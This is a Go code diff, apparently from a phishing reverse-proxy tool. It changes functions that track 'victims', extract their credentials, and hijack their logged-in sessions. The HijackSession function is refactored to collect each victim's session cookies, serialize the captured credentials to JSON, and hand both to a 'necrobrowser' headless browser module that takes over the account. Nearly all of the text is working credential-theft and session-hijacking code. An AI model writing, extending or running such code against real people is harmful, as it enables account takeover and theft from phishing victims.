@@ -329,7 +329,7 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
 					module.Identifier, t.ID, cookieDomain))
 
 			response.Header.Add("If-Range", t.ID)
-			module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
+			// module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
 			trackingFound = true
 		}
 	}
@@ -401,6 +401,11 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 // If the request URL matches those defined in authSession in the config, then
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
+
+	if !t.Session.Config.NecroBrowser.Enabled {
+		return
+	}
+
 	getSession := false
 
 	victim, err := t.GetVictim(t)
@@ -415,47 +420,38 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		}
 	}
 
+	if !getSession {
+		return
+	}
+
+
+	//
 	// HIJACK!
-	if getSession {
-		var sessCookies []http.Cookie
-		var cookies string
+	//
+	var sessCookies []http.Cookie
 
-		// get all the cookies from the CookieJar
-		victim.Cookies.Range(func(k, v interface{}) bool {
-			_, c := k.(string), v.(http.Cookie)
-			j, err := json.Marshal(c)
-			if err != nil {
-				t.Warning(err.Error())
-			}
+	// get all the cookies from the CookieJar
+	victim.Cookies.Range(func(k, v interface{}) bool {
+		_, c := k.(string), v.(http.Cookie)
+		sessCookies = append(sessCookies, c)
+		return true
+	})
 
-			cookies += string(j) + " "
-			t.Debug("Adding cookie: %s \n %v", string(j), c)
-
-			sessCookies = append(sessCookies, c)
-
-			return true
-		})
-
-		t.Debug("Authenticated Session for %s: %s", t.ID, tui.Red(cookies))
-
-		// Send to NecroBrowser
-		if t.Session.Config.NecroBrowser.Enabled == true {
-			t.Info("NecroBrowser Enabled.")
-			t.Info("%+v", t.Session.Config.NecroBrowser.Profile)
-
-			m, err := t.Session.Module("necrobrowser")
-			if err != nil {
-				t.Error("%s", err)
-			} else {
-				nb, ok := m.(*necrobrowser.Necrobrowser)
-				if ok {
-					go nb.InstrumentNecroBrowser(sessCookies)
-				}
-			}
-		} else {
-			t.Info("NecroBrowser Disabled.")
+	// Pass credentials
+	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
+	if err != nil {
+		t.Warning(err.Error())
+	}
+	
+	m, err := t.Session.Module("necrobrowser")
+	if err != nil {
+		t.Error("%s", err)
+	} else {
+		nb, ok := m.(*necrobrowser.Necrobrowser)
+		if ok {
+			go nb.Instrument(sessCookies, string(creds))
 		}
 	}
 
-	return nil
+	return
 }
